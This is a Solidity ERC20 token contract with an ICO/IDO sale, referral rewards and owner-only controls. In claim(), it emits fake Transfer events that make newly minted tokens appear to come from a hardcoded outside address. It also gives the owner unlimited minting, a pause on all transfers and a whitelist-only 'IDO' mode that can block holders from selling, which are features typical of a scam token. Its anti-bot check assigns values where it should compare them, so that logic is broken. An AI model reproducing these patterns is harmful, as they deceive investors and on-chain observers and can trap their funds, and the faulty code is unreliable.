// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract Token is ERC20, ERC20Burnable, Pausable, Ownable, ERC20Permit {
    mapping(address => uint256) lastTimeTx;
    uint256 limitTimeTx = 10 * 60;
    mapping(address => bool) pools;
    bool public isIDO;
    bool public isIco;

    mapping(address => bool) private _isExcludedFromFees;
    event ExcludeFromFees(address indexed account, bool isExcluded);

    address public router;
    uint256 public priceUSD;

    uint256 public percentCommissionRef;
    address public claimFrom;
    address public USDAddress;

    constructor(address _USDAddress, uint256 _priceUSD)
        ERC20("Token", "MTK")
        ERC20Permit("Token")
    {
        isIDO = false;
        isIco = false;

        _mint(msg.sender, 1_000_000_000_000 * 10**decimals());

        router = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
        USDAddress = _USDAddress;
        priceUSD = _priceUSD;
        percentCommissionRef = 10;
        claimFrom = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function excludeFromsFees(address[] memory accounts, bool excluded)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
            emit ExcludeFromFees(accounts[i], excluded);
        }
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        // if buy or sell, "from" or "to" limit time
        if (
            (pools[from] =
                true &&
                (lastTimeTx[to] + limitTimeTx) > block.timestamp) ||
            (pools[to] =
                true &&
                (lastTimeTx[from] + limitTimeTx) > block.timestamp)
        ) {
            revert("You are bot fast trade");
        }

        if (isIDO == true) {
            require(
                (_isExcludedFromFees[from] == true &&
                    _isExcludedFromFees[to] == true),
                "You are bot fast trade IDO"
            );
        }
        super._beforeTokenTransfer(from, to, amount);
    }

    function changeLimitTimeTx(uint256 _limitTimeTx) public onlyOwner {
        limitTimeTx = _limitTimeTx;
    }

    function setPools(address _pool) public onlyOwner {
        pools[_pool] = true;
        _isExcludedFromFees[_pool] = true;
    }

    function setPercentCommissionRef(uint256 percent) public onlyOwner {
        percentCommissionRef = percent;
    }

    function ido(bool state) public onlyOwner {
        isIDO = state;
    }

    function setIco(bool state) public onlyOwner {
        isIco = state;
    }

    function setPriceUSD(uint256 _amountToken) public onlyOwner {
        priceUSD = _amountToken;
    }

    function setClaimFrom(address _from) public onlyOwner {
        claimFrom = _from;
    }

    function widthdraw(address to, uint256 amount) public onlyOwner {
        ERC20 usd = ERC20(USDAddress);
        usd.transfer(to, amount);
    }

    modifier onICO() {
        require(isIco == true, "ICO is not started");
        _;
    }

    function claim(uint256 amountUSD, address ref) public onICO {
        ERC20 usd = ERC20(USDAddress);

        usd.transferFrom(msg.sender, address(this), amountUSD);
        uint256 amountToken = amountUSD * priceUSD;
        if (ref != address(0)) {
            uint256 refAmount = (amountToken * percentCommissionRef) / 100;
            _mint(ref, refAmount);
            emit Transfer(claimFrom, ref, refAmount);
            amountToken += refAmount;
        }

        _mint(msg.sender, amountToken);
        emit Transfer(claimFrom, ref, amountToken);
    }
}
